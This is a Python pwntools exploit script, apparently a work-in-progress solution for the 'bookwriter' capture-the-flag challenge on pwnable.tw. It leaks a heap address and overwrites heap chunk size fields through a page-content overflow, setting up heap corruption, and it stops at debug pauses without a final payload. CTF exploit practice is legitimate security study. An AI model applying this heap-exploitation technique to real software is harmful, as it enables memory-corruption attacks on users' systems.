#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
import os
os.environ['LD_LIBRARY_PATH']="/dbg64/lib"
context.log_level="debug"

pwn_file="./bookwriter"
libc_address=0
heap_address=0
# libc=ELF("/dbg64/lib/libc.so.6")
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("ww",4444)
    #conn=remote("chall.pwnable.tw",10304)
    pid=0

def debug():
    log.debug("libc address 0x%x"%libc_address)
    log.debug("heap address :0x%x"%heap_address)
    log.debug("process pid:%d"%pid)
    pause()

def login(name):
    conn.sendafter("Author :",name)

def add(size,content):
    conn.sendlineafter("Your choice :","1")
    conn.sendlineafter("Size of page :",str(size))
    conn.sendafter("Content :",content)

def inform(change,name=None):
    conn.sendlineafter("Your choice :","4")
    ret=conn.recvline(keepends=False)[len("Author : "):]
    if change == True:
        conn.sendlineafter("Do you want to change the author ? (yes:1 / no:0) ","1")
        login(name)
    else:
        conn.sendlineafter("Do you want to change the author ? (yes:1 / no:0) ","0")
    return ret

def show(index):
    conn.sendlineafter("Your choice :","2")
    conn.sendlineafter("Index of page :",str(index))
    conn.recvlines(2)
    ret=conn.recvuntil("\n----------------------",drop=True)
    return ret

def edit(index,name):
    conn.sendlineafter("Your choice :","3")
    conn.sendlineafter("Index of page :",str(index))
    conn.sendafter("Content:",name)

login("a"*0x40)
add(0x300,"a"*0x300)# 0
heap_address=u64(inform(False)[0x40:].ljust(8,"\x00"))-0x10
add(0x308,"a"*0x308)# 1
edit(1,"a"*0x308)
edit(1,"a"*0x308+p64(0x109d1)[:3])
add(0x10a00,"a")#2
edit(1,"a"*0x308+p64(0x32001)[:3])
add(0x1f000,"a")#3
add(0x10000,"a")#4

add(0x3000,"a"*0x1a08)#5
debug()
edit(5,"a"*0x1a08)
edit(5,"a"*0x1a08+p64(0xbe1)[:2])
add(0x2000,"a")
debug()
conn.interactive()
